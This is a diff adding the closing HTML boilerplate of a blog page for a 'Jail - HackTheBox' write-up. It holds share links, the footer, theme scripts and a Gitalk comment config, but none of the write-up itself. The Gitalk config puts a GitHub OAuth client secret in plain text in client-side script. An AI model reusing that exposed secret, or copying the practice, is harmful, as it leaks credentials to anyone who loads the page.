+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2021/05/20/Jail-HackTheBox/&title=《Jail - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2021/05/20/Jail-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Jail - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2021/05/20/Jail-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2021/05/20/Jail-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/05/19/Pit-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Pit - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2021</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2021/05/20/Jail-HackTheBox/&title=《Jail - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2021/05/20/Jail-HackTheBox/&title=《Jail - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2021/05/20/Jail-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Jail - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2021/05/20/Jail-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2021/05/20/Jail-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJklEQVR42u3aQW7DMAwEwP7/0y7QW1FEWZJukEijk9E6jsYHhqT49RWv62f9vV7f/+hT6+vk+c2FgYHxsYxrufKt54D1kx/d/2hvGBgY5zCSIJt/ZQ+QB3cMDAyMPIFLAnT+CjAwMDBeE3DX4XX9BAwMDIw1IwmgedjtFasvqsUxMDA+kDE5GPjv6xedb2BgYLwx4yquPO3L/3LDrjAwMLZmJElb9RjgrnK3isfAwNibMZmzqg5JrMG9lhwGBsbejEmord6TN8vK/8XAwNiaUQ24+UPzz+aBGAMD40xGtUTsDYflhW71BWFgYJzGmB869oJsrwH36xoDA+MARp60VZtivdZbuRjGwMDYmtFrjd1bPSdpYiFBxMDA2JqRPCgPhdWNToI4BgbGOYy87TU5eegF1uhVYmBgbMrotczyYJqXvqPhMAwMjCMZvSLzCtZdx58YGBgnM/IhiaQllw9z5E9+kttiYGBsx8i3mI9ZVNO+yevDwMA4gVEddJiPeZXDaPCyMDAwTmBU2/3VAYvqKFh5bxgYGFsz7jqGzJ9QLVbznwcMDIxdGVdx3TvUlYfjJ+EeAwNja0ZvPCv5yknhWk0xMTAwTmD0DgOqbbtJChiFeAwMjAMYeQK3DoJ5cVtN7578YmBgYGAM2mHVjSaZLAYGBka1mKwyJqnnDakhBgbGxzLyQnTeoJ8cRZRn3DAwMLZg9ArIKilv5OUDYTecb2BgYLw74xvmFah2FzI6HQAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
